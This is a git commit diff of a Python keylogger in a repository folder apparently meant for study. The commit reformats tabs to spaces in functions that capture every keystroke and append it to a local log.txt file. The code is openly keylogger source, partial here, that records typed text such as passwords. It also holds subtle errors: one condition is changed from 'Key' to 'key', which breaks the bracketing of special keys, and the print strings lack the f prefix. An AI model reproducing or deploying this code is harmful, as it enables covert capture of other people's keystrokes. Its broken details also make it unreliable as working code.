1f46b76567d8dcf8fddb1f7f098ea4cca6b2f63d
mhuston <55804897+MalloryHuston@users.noreply.github.com>
2025-10-21 21:08:53 -0700

    Update keylogger.py

--- Cryptography/keylogger/keylogger.py
+++ Cryptography/keylogger/keylogger.py
@@ -7,32 +7,32 @@ keys = []
 
 
 def on_press(key):
-	keys.append(key)
-	write_file(keys)
+    keys.append(key)
+    write_file(keys)
 
-	try:
-		print('alphanumeric key {key.char} pressed')
-	except AttributeError:
-		print('special key {key} pressed')
-		
+    try:
+        print('alphanumeric key {key.char} pressed')
+    except AttributeError:
+        print('special key {key} pressed')
+
 
 def write_file(keys):
-	# 'a' mode opens the file for appending
-	with open('log.txt', 'a') as f:
-		for key in keys:
-			# Removing '' from the key string
-			k = str(key).replace("'", "")
-			if k.find("space") > 0:
-				# Adding new line for readability
-				f.write('\n')
-			elif k.find("Key") == -1:
-				f.write(k)
-			else:
-				# Special keys in square brackets
-				f.write(f'[{k}]')
-			# Adding a space after each key for readability
-			f.write(' ')
-		keys.clear()  # Clearing the keys list after writing to the file
+    # 'a' mode opens the file for appending
+    with open('log.txt', 'a') as f:
+        for key in keys:
+            # Removing '' from the key string
+            k = str(key).replace("'", "")
+            if k.find("space") > 0:
+                # Adding new line for readability
+                f.write('\n')
+            elif k.find("key") == -1:
+                f.write(k)
+            else:
+                # Special keys in square brackets
+                f.write(f'[{k}]')
+            # Adding a space after each key for readability
+            f.write(' ')
+        keys.clear()  # Clearing the keys list after writing to the file
 
 
 def on_release(key):
